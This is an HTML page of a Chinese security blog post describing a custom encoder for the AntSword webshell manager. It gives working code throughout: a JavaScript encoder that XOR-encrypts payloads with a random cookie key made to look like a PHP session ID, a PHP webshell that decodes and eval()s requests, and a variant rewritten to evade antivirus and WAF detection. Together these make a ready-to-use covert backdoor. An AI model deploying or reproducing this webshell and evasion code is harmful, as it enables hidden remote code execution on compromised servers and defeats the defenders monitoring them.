@@ -1,0 +1,531 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>基于随机Cookie的蚁剑动态秘钥编码器 - </title><meta name="Description" content="yzddMr6&#39;s Blog"><meta property="og:title" content="基于随机Cookie的蚁剑动态秘钥编码器" />
+<meta property="og:description" content="1 前言在上一篇蚁剑实现动态秘钥编码器解码器中，本人为了规避握手交换秘钥的特征，采用了利用时间生成随机秘钥的办法。 但是在实际使用的过程中还是会" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://yzddmr6.com/posts/antsword-xor-encoder-2/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2019-12-09T10:29:32+00:00" />
+<meta property="article:modified_time" content="2019-12-09T10:29:32+00:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp"/>
+
+<meta name="twitter:title" content="基于随机Cookie的蚁剑动态秘钥编码器"/>
+<meta name="twitter:description" content="1 前言在上一篇蚁剑实现动态秘钥编码器解码器中，本人为了规避握手交换秘钥的特征，采用了利用时间生成随机秘钥的办法。 但是在实际使用的过程中还是会"/>
+<meta name="application-name" content="yzddMr6&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="yzddMr6&#39;s Blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://yzddmr6.com/posts/antsword-xor-encoder-2/" /><link rel="prev" href="https://yzddmr6.com/posts/bypass-waf-sqlin/" /><link rel="next" href="https://yzddmr6.com/posts/shellcode-bypass-360-1/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "基于随机Cookie的蚁剑动态秘钥编码器",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/yzddmr6.com\/posts\/antsword-xor-encoder-2\/"
+        },"genre": "posts","keywords": "中国蚁剑","wordcount":  1040 ,
+        "url": "https:\/\/yzddmr6.com\/posts\/antsword-xor-encoder-2\/","datePublished": "2019-12-09T10:29:32+00:00","dateModified": "2019-12-09T10:29:32+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/yzddmr6.com\/images\/avatar.webp",
+                    "width":  640 ,
+                    "height":  640 
+                }},"author": {
+                "@type": "Person",
+                "name": "yzddMr6"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="">yzddMr6&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/showcase/"> 作品 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="切换主题">
+                        <option value="light">浅色</option>
+                        <option value="dark">深色</option>
+                        <option value="black">黑色</option>
+                        <option value="auto">跟随系统</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="">yzddMr6&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/showcase/" title="">作品</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="切换主题">
+                    <option value="light">浅色</option>
+                    <option value="dark">深色</option>
+                    <option value="black">黑色</option>
+                    <option value="auto">跟随系统</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#正文">正文</a>
+      <ul>
+        <li><a href="#编码器的ext参数">编码器的ext参数</a></li>
+        <li><a href="#随机生成cookie">随机生成Cookie</a></li>
+        <li><a href="#具体实现">具体实现</a>
+          <ul>
+            <li><a href="#编码器">编码器</a></li>
+            <li><a href="#shell原型">Shell原型</a></li>
+            <li><a href="#免杀处理">免杀处理</a></li>
+          </ul>
+        </li>
+        <li><a href="#连接测试">连接测试</a></li>
+      </ul>
+    </li>
+    <li><a href="#最后">最后</a></li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">基于随机Cookie的蚁剑动态秘钥编码器</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/yzddmr6" title="Author" target="_blank" rel="noopener noreferrer author" class="author">yzddMr6</a>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"><i class="far fa-folder fa-fw"></i>技术文章</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2019-12-09">2019-12-09</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2019-12-09">2019-12-09</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1040 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 3 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#正文">正文</a>
+      <ul>
+        <li><a href="#编码器的ext参数">编码器的ext参数</a></li>
+        <li><a href="#随机生成cookie">随机生成Cookie</a></li>
+        <li><a href="#具体实现">具体实现</a>
+          <ul>
+            <li><a href="#编码器">编码器</a></li>
+            <li><a href="#shell原型">Shell原型</a></li>
+            <li><a href="#免杀处理">免杀处理</a></li>
+          </ul>
+        </li>
+        <li><a href="#连接测试">连接测试</a></li>
+      </ul>
+    </li>
+    <li><a href="#最后">最后</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><meta name="referrer" content="no-referrer" />
+<h2 id="前言" class="headerLink">
+    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>1 前言</h2><p>在上一篇<a href="https://yzddmr6.tk/posts/antsword-xor-encoder/" target="_blank" rel="noopener noreferrer">蚁剑实现动态秘钥编码器解码器</a>中，本人为了规避握手交换秘钥的特征，采用了利用时间生成随机秘钥的办法。</p>
+<p>但是在实际使用的过程中还是会出现各种各样的玄学BUG，导致利用失败，我个人不是特别满意。</p>
+<p>研究了一下蚁剑编码器的ext参数后，决定采用利用随机Cookie来产生随机秘钥的方式。</p>
+<h2 id="正文" class="headerLink">
+    <a href="#%e6%ad%a3%e6%96%87" class="header-mark"></a>2 正文</h2><h3 id="编码器的ext参数" class="headerLink">
+    <a href="#%e7%bc%96%e7%a0%81%e5%99%a8%e7%9a%84ext%e5%8f%82%e6%95%b0" class="header-mark"></a>2.1 编码器的ext参数</h3><p>本来一直等蚁剑作者写编码器的第三篇，结果一直没等到。。。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900383257-4f526489-5d72-4d99-85fe-6fd0a21d5bce.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900383257-4f526489-5d72-4d99-85fe-6fd0a21d5bce.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900383257-4f526489-5d72-4d99-85fe-6fd0a21d5bce.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900383257-4f526489-5d72-4d99-85fe-6fd0a21d5bce.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900383257-4f526489-5d72-4d99-85fe-6fd0a21d5bce.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900383257-4f526489-5d72-4d99-85fe-6fd0a21d5bce.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>算了还是自己研究一下吧</p>
+<p>首先新建一个编码器，名字叫test吧</p>
+<p>加入一行<code>console.log(ext.opts.httpConf);</code></p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900383556-dc1b8f50-2c79-4b70-8688-4d1dcfde8009.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900383556-dc1b8f50-2c79-4b70-8688-4d1dcfde8009.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900383556-dc1b8f50-2c79-4b70-8688-4d1dcfde8009.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900383556-dc1b8f50-2c79-4b70-8688-4d1dcfde8009.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900383556-dc1b8f50-2c79-4b70-8688-4d1dcfde8009.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900383556-dc1b8f50-2c79-4b70-8688-4d1dcfde8009.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>然后随便连接一个shell，打开开发者工具，可以看到已经打印出了我们所需要的信息</p>
+<p>包括shell请求的body跟headers头</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900383693-02eff20b-7976-43ed-b530-867b34466f31.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900383693-02eff20b-7976-43ed-b530-867b34466f31.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900383693-02eff20b-7976-43ed-b530-867b34466f31.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900383693-02eff20b-7976-43ed-b530-867b34466f31.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900383693-02eff20b-7976-43ed-b530-867b34466f31.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900383693-02eff20b-7976-43ed-b530-867b34466f31.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>抓包看一下，headers头的结果跟抓包的结果是一致的</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900383822-a4f99bd7-4668-4120-b9b1-12b478515a0a.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900383822-a4f99bd7-4668-4120-b9b1-12b478515a0a.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900383822-a4f99bd7-4668-4120-b9b1-12b478515a0a.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900383822-a4f99bd7-4668-4120-b9b1-12b478515a0a.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900383822-a4f99bd7-4668-4120-b9b1-12b478515a0a.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900383822-a4f99bd7-4668-4120-b9b1-12b478515a0a.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>那么我们能否从编码器中修改headers头呢</p>
+<p>我们在编码器中加入一行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ext.opts.httpConf.headers[&#39;User-Agent&#39;]=&#39;yzddMr6&#39;;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900384241-8e165fa5-267c-44ac-9d1c-fd685952ddbf.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900384241-8e165fa5-267c-44ac-9d1c-fd685952ddbf.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900384241-8e165fa5-267c-44ac-9d1c-fd685952ddbf.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900384241-8e165fa5-267c-44ac-9d1c-fd685952ddbf.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900384241-8e165fa5-267c-44ac-9d1c-fd685952ddbf.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900384241-8e165fa5-267c-44ac-9d1c-fd685952ddbf.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900384562-d81a4364-b3b7-4382-89a0-050233151245.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900384562-d81a4364-b3b7-4382-89a0-050233151245.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900384562-d81a4364-b3b7-4382-89a0-050233151245.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900384562-d81a4364-b3b7-4382-89a0-050233151245.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900384562-d81a4364-b3b7-4382-89a0-050233151245.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900384562-d81a4364-b3b7-4382-89a0-050233151245.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>可以看到我们已经成功修改了shell中UA的值。</p>
+<p>同理，我们也可以在编码器中对其他header头或者body进行修改。</p>
+<h3 id="随机生成cookie" class="headerLink">
+    <a href="#%e9%9a%8f%e6%9c%ba%e7%94%9f%e6%88%90cookie" class="header-mark"></a>2.2 随机生成Cookie</h3><p>既然我们已经可以任意修改shell的请求信息，我们就可以把秘钥放在一个指定的headers字段里，shell获取后再对payload进行加解密。</p>
+<p>但是突然多出来一个奇奇怪怪的字段，长时间后就会变成waf识别的特征。</p>
+<p>那么有没有什么是变化的，并且很常见的headers头呢？</p>
+<p>我们就可以想到利用Cookie。</p>
+<p>参考蚁剑的aes编码器，它所采用的方法是人工首先访问shell生成一个sessionid，填入shell配置后作为后面通讯的秘钥。</p>
+<p>但是实际上因为我们已经可以控制cookie字段，我们完全可以在编码器中每次生成一个随机的cookie，这样就省去了人工操作的一步。</p>
+<p>有一个坑要注意，php的session id一般是26位的，所以我们最好也生成一个26位的秘钥，增强伪装性。（虽然可能并没有什么卵用）</p>
+<h3 id="具体实现" class="headerLink">
+    <a href="#%e5%85%b7%e4%bd%93%e5%ae%9e%e7%8e%b0" class="header-mark"></a>2.3 具体实现</h3><h4 id="编码器" class="headerLink">
+    <a href="#%e7%bc%96%e7%a0%81%e5%99%a8" class="header-mark"></a>2.3.1 编码器</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;use strict&#39;;
+</span></span><span class="line"><span class="cl">//code by yzddmr6
+</span></span><span class="line"><span class="cl">module.exports = (pwd, data, ext = {}) =&gt; {
+</span></span><span class="line"><span class="cl">  let randomID = `x${Math.random().toString(16).substr(2)}`;
+</span></span><span class="line"><span class="cl">  function xor(payload) {
+</span></span><span class="line"><span class="cl">    let crypto = require(&#39;crypto&#39;);
+</span></span><span class="line"><span class="cl">    let key = crypto.createHash(&#39;md5&#39;).update(randomID).digest(&#39;hex&#39;).substr(6);
+</span></span><span class="line"><span class="cl">    ext.opts.httpConf.headers[&#39;Cookie&#39;] = &#39;PHPSESSID=&#39; + key;
+</span></span><span class="line"><span class="cl">    key = key.split(&#34;&#34;).map(t =&gt; t.charCodeAt(0));
+</span></span><span class="line"><span class="cl">    //let payload=&#34;phpinfo();&#34;;
+</span></span><span class="line"><span class="cl">    let cipher = payload.split(&#34;&#34;).map(t =&gt; t.charCodeAt(0));
+</span></span><span class="line"><span class="cl">    for (let i = 0; i &lt; cipher.length; i++) {
+</span></span><span class="line"><span class="cl">      cipher[i] = cipher[i] ^ key[i % 26]
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    cipher = cipher.map(t =&gt; String.fromCharCode(t)).join(&#34;&#34;)
+</span></span><span class="line"><span class="cl">    cipher = Buffer.from(cipher).toString(&#39;base64&#39;);
+</span></span><span class="line"><span class="cl">    //console.log(cipher)
+</span></span><span class="line"><span class="cl">    return cipher;
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  data[&#39;_&#39;] = Buffer.from(data[&#39;_&#39;]).toString(&#39;base64&#39;);
+</span></span><span class="line"><span class="cl">  data[pwd] = `eval(base64_decode(&#34;${data[&#39;_&#39;]}&#34;));`;
+</span></span><span class="line"><span class="cl">  data[pwd]=xor(data[pwd]);
+</span></span><span class="line"><span class="cl">  delete data[&#39;_&#39;];
+</span></span><span class="line"><span class="cl">  return data;
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="shell原型" class="headerLink">
+    <a href="#shell%e5%8e%9f%e5%9e%8b" class="header-mark"></a>2.3.2 Shell原型</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">@$post=base64_decode($_REQUEST[&#39;test&#39;]);
+</span></span><span class="line"><span class="cl">$key=@$_COOKIE[&#39;PHPSESSID&#39;];
+</span></span><span class="line"><span class="cl">for($i=0;$i&lt;strlen($post);$i++){
+</span></span><span class="line"><span class="cl">    $post[$i] = $post[$i] ^ $key[$i%26];
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">@eval($post);
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="免杀处理" class="headerLink">
+    <a href="#%e5%85%8d%e6%9d%80%e5%a4%84%e7%90%86" class="header-mark"></a>2.3.3 免杀处理</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">class Cookie
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">    function __construct()
+</span></span><span class="line"><span class="cl">    {
+</span></span><span class="line"><span class="cl">        $key=@$_COOKIE[&#39;PHPSESSID&#39;];
+</span></span><span class="line"><span class="cl">        @$post=base64_decode($_REQUEST[&#39;test&#39;]);
+</span></span><span class="line"><span class="cl">        for($i=0;$i&lt;strlen($post);$i++){
+</span></span><span class="line"><span class="cl">            $post[$i] = $post[$i] ^ $key[$i%26];
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">        return $post;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    function __destruct()
+</span></span><span class="line"><span class="cl">    {return @eval($this-&gt;__construct());}
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">$check=new Cookie();
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900384760-56a49e0f-5695-415a-83b6-978d4d8242ef.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900384760-56a49e0f-5695-415a-83b6-978d4d8242ef.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900384760-56a49e0f-5695-415a-83b6-978d4d8242ef.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900384760-56a49e0f-5695-415a-83b6-978d4d8242ef.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900384760-56a49e0f-5695-415a-83b6-978d4d8242ef.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900384760-56a49e0f-5695-415a-83b6-978d4d8242ef.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="连接测试" class="headerLink">
+    <a href="#%e8%bf%9e%e6%8e%a5%e6%b5%8b%e8%af%95" class="header-mark"></a>2.4 连接测试</h3><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900384896-5cca44f3-be28-4bf6-8cd0-b7a9cfb5d049.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900384896-5cca44f3-be28-4bf6-8cd0-b7a9cfb5d049.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900384896-5cca44f3-be28-4bf6-8cd0-b7a9cfb5d049.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900384896-5cca44f3-be28-4bf6-8cd0-b7a9cfb5d049.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900384896-5cca44f3-be28-4bf6-8cd0-b7a9cfb5d049.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900384896-5cca44f3-be28-4bf6-8cd0-b7a9cfb5d049.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385035-26886543-d3e7-4c2c-ac82-238dffc241d1.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385035-26886543-d3e7-4c2c-ac82-238dffc241d1.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385035-26886543-d3e7-4c2c-ac82-238dffc241d1.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385035-26886543-d3e7-4c2c-ac82-238dffc241d1.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385035-26886543-d3e7-4c2c-ac82-238dffc241d1.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385035-26886543-d3e7-4c2c-ac82-238dffc241d1.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h2 id="最后" class="headerLink">
+    <a href="#%e6%9c%80%e5%90%8e" class="header-mark"></a>3 最后</h2><p>还是老问题，蚁剑的其他参数只是一层base64，这个就需要大家自己手工去改了。</p>
+<p>蚁剑牛逼！</p>
+</div>
+
+        
+
+
+<h2>相关内容</h2>
+<div class="related-container">
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/as-exploits/">As-Exploits: 中国蚁剑后渗透框架</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/antsword-diy-4/">中国蚁剑源码分析</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/antsword-diy-3/">蚁剑改造计划之实现JSP一句话</a>
+            </h2>
